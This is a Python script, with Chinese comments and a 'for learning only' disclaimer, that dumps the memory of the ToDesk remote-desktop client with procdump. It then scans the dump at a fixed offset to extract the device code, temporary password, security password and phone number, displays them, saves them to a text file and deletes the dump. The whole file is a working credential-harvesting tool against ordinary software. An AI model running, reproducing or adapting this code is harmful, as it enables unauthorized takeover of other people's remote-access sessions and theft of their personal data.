import subprocess
from datetime import datetime
import os
from tkinter import messagebox


def get_PID():
    result = subprocess.run('tasklist | find /I "ToDesk.exe"', shell=True, capture_output=True, text=True)
    output_lines = result.stdout.strip().split('\n')
    console_data = []
    pid = -1
    for line in output_lines:
        parts = line.split()
        console_data.append(parts)

    for i in console_data:
        if i[2] == "Console":
            pid = i[1]

    return pid


def dump_Process(pid):
    command = f'procdump64.exe -accepteula -ma {pid}'
    subprocess.run(command, shell=True, check=False)


def get_Current_Date():
    current_date = datetime.now().date()
    return current_date.strftime('%Y%m%d')


def find_dmp_file():
    dmp_files = []
    current_dir = os.getcwd()
    for file in os.listdir(current_dir):
        if file.endswith('.dmp'):
            file_path = os.path.join(current_dir, file)
            dmp_files.append(file_path)
    if len(dmp_files) == 0:
        messagebox.showinfo("提示", "当前目录下未找到.dmp文件")
        return None
    elif len(dmp_files) > 1:
        messagebox.showinfo("提示", "当前目录下找到多个.dmp文件")
        return None
    else:
        return dmp_files[0]


def read_Hex(file_path):
    with open(file_path, 'rb') as file:
        content = file.read()

    start_offset = 348992
    length = 100000
    data_segment = content[start_offset:start_offset + length]
    hex_list = [format(byte, '02x') for byte in data_segment]
    hex_data = " ".join(hex_list)

    decimal_list = [int(hex_value, 16) for hex_value in hex_data.split()]

    data = ""
    for decimal in decimal_list:
        if (decimal >= 33 and decimal <= 126):
            data += chr(decimal)
        else:
            data += ("#")
    return data


def store_Data(msg):
    result = []
    temp = ""
    for char in msg:
        if char == "#":
            if not temp.endswith("#"):
                temp += char
            else:
                continue
        else:
            temp += char
        if temp.endswith("#"):
            segment = temp.rstrip("#")
            if segment:
                result.append(segment)
            temp = ""
    if temp:
        result.append(temp)

    return result


def delete_dmp_file(file_path):
    os.remove(file_path)
    #messagebox.showinfo("提示", "已成功删除文件！")


def save_msg():
    result_text = f"设备代码：{device_id}\n临时密码：{temp_key}\n安全密码：{safe_key}\n手机号码：{phone}\n"
    file_name = datetime.now().strftime('%Y%m%d%H%M%S') + "-todesk临时代码.txt"
    with open(file_name, 'w', encoding='utf-8') as f:
        f.write(result_text)
    messagebox.showinfo("提示", "程序结果已保存到根目录下")


if __name__ == "__main__":
    try:
        messagebox.showinfo("声明", "仅供学习使用，严禁用于非法用途，后果自负!")
        pid = get_PID()  # 获取todesk的PID
        dump_Process(pid)  # 根据PID将进程中的数据转储到本地
        date = get_Current_Date()  # 自动获取当前的日期

        file_path = find_dmp_file()
        if file_path:
            read_msg = read_Hex(file_path)
            stored_msg = store_Data(read_msg)
            delete_dmp_file(file_path)  # 获取信息之后删除原来的.dmp文件

            index = stored_msg.index(date)
            temp_key = stored_msg[index - 24]
            safe_key = stored_msg[index - 23]
            device_id = stored_msg[index - 7]
            phone = stored_msg[index + 7]
            
            messagebox.showinfo("信息", f"设备代码：{device_id}\n临时密码：{temp_key}\n安全密码：{safe_key}\n手机号码：{phone}\n")
            save_msg()  # 把信息保存到本地的txt文本中
            
    except:
        messagebox.showerror("错误", "程序运行出现异常，请检查相关设置或数据，或联系制作者！")